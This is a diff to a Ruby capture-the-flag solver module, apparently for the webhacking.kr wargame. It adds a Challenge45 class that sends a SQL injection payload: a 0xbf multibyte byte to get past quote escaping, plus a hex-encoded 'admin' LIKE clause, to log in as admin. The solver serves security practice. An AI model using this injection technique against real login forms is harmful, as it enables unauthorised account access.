@@ -782,6 +782,29 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 45
+  class Challenge45 < ChallengeBase
+    CHALLENGE = 45
+
+    PATH = '/challenge/web-22/'
+    PARAM_ID = 'id'
+    PARAM_PW = 'pw'
+    LOGIN = 'admin'
+    PAYLOAD = "\xbf' OR `id` LIKE 0x$HEX$ #"
+
+    def exec
+      payload = PAYLOAD.sub('$HEX$', LOGIN.unpack1('H*'))
+      query = URI.encode_www_form(
+        PARAM_ID => payload,
+        PARAM_PW => 'password'
+      )
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 46
   class Challenge46 < ChallengeBase
     CHALLENGE = 46
